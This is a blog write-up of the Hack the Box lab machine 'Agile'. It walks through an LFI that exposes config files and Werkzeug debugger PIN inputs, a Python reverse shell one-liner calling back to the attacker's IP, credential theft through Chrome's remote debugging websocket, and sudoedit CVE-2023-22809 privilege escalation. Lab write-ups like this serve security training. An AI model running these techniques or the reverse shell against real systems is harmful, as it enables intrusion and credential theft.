+++
author = "Nick"
categories = ["hack the box", "Medium"]
date = 2023-08-03T11:00:00.000Z
publishDate = 2023-08-03T11:00:00.000Z
description = "Welcome back! Today we’re going to do the same thing we do every day, Hack the Box! Today’s machine is Agile. This machine is listed as a medium Linux machine. Let’s go!"
summary = ""
draft = false
slug = "hack-the-box-agile"
tags = ["hack the box", "Medium", "Linux", "Agile", "LFI", "RCE", "CVE-2023-22809", "websocket", "Proxy", "Chrome Dev Tools", ]
title = "Hack the Box - Agile"
url = "/hack-the-box-agile"
thumbnail = "/images/agile/logo.png"
+++

Welcome back! Today we're going to do the same thing we do every day, Hack the Box! Today's machine is Agile. This machine is listed as a medium Linux machine. Let's go!

We start off with our standard enumeration of the target - `rustscan -a $TARGET -- -sV -sC`. Here's our results:

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Pretty small result set. Right off the bat we see we need to add `superpass.htb` to our host file. We do that and head over to the page being hosted. We land on a page for SuperPassword. While we manually sift through the site, we'll also kick off a `gobuster` scan to see what else we can find.

Command:
`gobuster dir -u http://superpass.htb -w /path/to/worldlist -t 70`

While that's going, we try to login with some basic `sql` injections and get some errors back.

![](/images/agile/agile1.png)

Now I wasn't able to recreate that `SQL` injection error, but luckily, I was proxying everything through `burpsuite`. There is a lot of leaked information here. We have the absolute path of the application as `/app/app/superpass`. We see the framework is `flask`. We know it uses some sort of interaction with a `MySQL` database below it. 

We see the entry as an interesting request:

![](/images/agile/agile2.png)

This seems to give us the content of the `debugger.js` file. What's interesting about this is that it's loading an internal resource for us to view. So we create an account on the site to further analyze. We then have access to create passwords. It comes with an 'export function' and an 'Add password function'.

![](/images/agile/agile4.png)

Now, when we start poking at the `download` function we see that if we supply some `LFI` commands, we get some results back implying we might be able to get something from it.

![](/images/agile/agile5.png)

We test that with a basic `LFI` for `/etc/passwd`. Sure enough, it does return the file:


![](/images/agile/agile6.png)

We also know the user we're after is `edwards`. So let's try to get this applications source code using the same method. We check the basic `app.py` first. The two things we note here is that the `app.config['SECRET_KEY]` value is set to a random set of characters.

![](/images/agile/agile7.png)

And that there are some additional `views` for us to inspect.

![](/images/agile/agile8.png)

When we inspect the `vault_views.py` we see the ability to view any row.

![](/images/agile/agile9.png)

So we run this request throught `intruder` with a 1-100 value range and nothing comes back. We assumably can only read values of other people. So, how do we become someone else? Cookies of course! So we start gathering `session cookies` from our proxy and use `flask-unsign` to decode them.

![](/images/agile/agile10.png)

So when attempting to access a page without being logged in, we're told to login. While attempting to access a row while being logged in returns a blank response. After trying quite a bit, I took a look around and see that the Box was PATCHED to remove this specific path. Shitttt. Back to the drawing board. We're probably going to need to leverage thie `LFI` in a way to get the PIN for the interactive console session. So we take a look at `/proc/self/environ` which shows us a path or two:

![](/images/agile/agile12.png)

So we check the path for the `/app/config_prod.json`.

![](/images/agile/agile13.png)

This is nice we might be able to use these at some point. Next we also check `/proc/self/cmdline` to see what was loaded.

![](/images/agile/agile14.png)

We see some `gunicorn` running on the localhost.

There are quite a few moving parts here, but nothing that is super helpful to getting into the `console` on the debug page. Inspecting the debug page with the `console` open shows it's a `wekzeug Debugger`. Now, some Googling on that lead me to [Hack Tricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug). According to the ticks, we should inspect how the PIN is generated in `python3.5/site-packages/werkzeug/debug/__init__.py`. So for us that path looks more like `app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py`.

Alright, looks like we're on the right track here. We need the following information:

`Username`
`Modname`
The `Absolute Path` of the app
The `mac address`
`Machine-id`

We know the `username` from our previous enumeration to be `www-data`. We know the `modname` to be `flask.app` from the debugging leak. We also know the `absolute path` from the debgging leak as well. Next on that list is the `mac address`. Now we can actually obtain this via a `LFI` if we parse some of the `proc` tables. In particular `/proc/self/net/arp`.

![](/images/agile/agile15.png)

Now we can convert that over as it's show.

![](/images/agile/agile16.png)

For us it's `345052353751`

![](/images/agile/agile17.png)

For the last part, we need the `machine-id`.

![](/images/agile/agile18.png)

We get `ed5b159560f54721827644bc9b220d00`

![](/images/agile/agile19.png)

Now we take our `machine-id` and combine it with our next value set:

![](/images/images/agile20.png)

We get `ed5b159560f54721827644bc9b220d00superpass.service`. Finally all our required vairables. Let's see if we can plug them in and run the script.

Command:
`python3 pin.py`

We get a pin value back:

![](/images/agile/agile21.png)

We plug it in and it doesn't work?! Reviewing the code and the PoC you can see that our value for `getattr(app, '__name__', getattr(app.__class__, '__name__'))` is not actually `Flask` it's `wsgi_app`. We modify that value and we still don't get the correct pin! What else is a valu that can change here - `MAC address`. We could have provided the wrong address since it's a virtual machine. According to [this](https://unix.stackexchange.com/questions/681303/how-to-view-mac-address-by-hardware-device) we can check `/sys/class/net/*/address`. In our case, we can't provide `*` so we just itterate through the `eth` value interfaces.

![](/images/agile/agile22.png)

Sure enough, it's different! Let's try this again, with the right value for the mac address. We print out our new pin and it works! Finally! We have console access!

![](/images/agile/agile23.png)

So now, we know from reading the dubber info that we can run `python` code here.

![](/images/agile/agile3.png)

We can provide a basic `python` reverse shell and hopefully catch it.

Supplied shell: `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`

Start up our `nc` listener and catch the shell!

![](/images/agile/agile24.png)

Ok, time to try and pivot out of `www-data` user. There's a lot of error and information getting dumped into the interface as well. My first thought is to leverage the `MySQL` credentials we obtained earlier via `config_prod.json` to log in and dump the database.

![](/images/agile/sql.png)

We dump the passwords from the database and try them against `SSH`. We get a hit for `corum`. We're able to login and get the `user.txt` flag! Time to figure out how to escalate. We copy over `linpeas` and `pspy` to see what data we can get. `linpeas` shows us that `Chrome` is running in a debugger mode on port `41829` and we also see something being hosted on `5555` as well.

![](/images/agile/agile25.png)
![](/images/agile/agile25.png)

In order to get to this location, we'll need to proxy our traffic because it's running locally.

Command:
`ssh -L 8888:127.0.0.1:5555 corum@superpass.htb`

Now when we visit port `8888` on our local host we should be able to see what's running. Looks like another version of the same software. I setup some `gobuster` to enumerate and then start poking at the `41829` port using the same method of port forwarding. Now when we visit this page, it's just blank. So we setup some enumeration on this as well, just in case. Turns out there's a `json` file location.

![](/images/agile/agile27.png)

When we visit the location, we get a websocket debugger url in our response:

![](/images/agile/agile28.png)

So this looks like cookie data from our previous application that we tried to decode and rencode. So to interact with `websociets` we can use [websocat](s://127.0.0.1:8888/devtools/page/50541417A6A7BF93CD3A8C68C4647B99).

We needed to re-create our tunnel underport `41829`. Then we try to `websocat` and get some information:

![](/images/agile/agile29.png)

This prompt expect some `JSON`. I'm just not exactly sure what. Research leads me [here to the DevTools page](https://chromedevtools.github.io/devtools-protocol/tot/Debugger/). So we enable the `Network` functionality. If we don't do so, we cannot send events to our `websocket`.

![](/images/agile/agile30.png)

Now that we can send some commands, there are some that look fun, like `network.setCookies`, `network.getCookies` and `network.getAllCookies`. I like the third, since it gives us more bang for our buck.

![](/images/agile/agile31.png)

We now have some kind of cookie for our test site. We reforward our port back to the `5555`. We modify the cookie value in the test site and refresh. We now have some new credentials!

![](/images/agile/agile32.png)

We take those credentials over to `SSH` and we're in... again!

![](/images/agile/agile34.png)

A `sudo -l` shows us that we can run some priviledged items as `edwards`. Specifically `sudoedit`. When we check `sudoedit --v` we see it's running `sudo` version 1.9.9. This version has a vulnerability [in it](https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc). So now we know that we can escalate with this function, we just need to find a way to leverage it. After snooping around and running `pspy` we spot our way out!

![](/images/agile/agile35.png)

We can catch a shell here, once this activates the `venv`!

So we use `sudo -u dev_admin EDITOR='nano -- /app/venv/bin/activate' sudoedit /app/config_test.json`. This will allow us to edit two file. Firstly the `activate` file the script calls, then our intended file of `config_test.json`. Once we've added our reverse shell to the `activate` file, we just wait for it to give us a shell!

![](/images/agile/agile36.png)

![](/images/agile/agile37.png)

Make sure that we have our `nc` listener running and wait for the connection to come in

![](/images/agile/root.png)

There we have it, a quite hard 'medium' machine!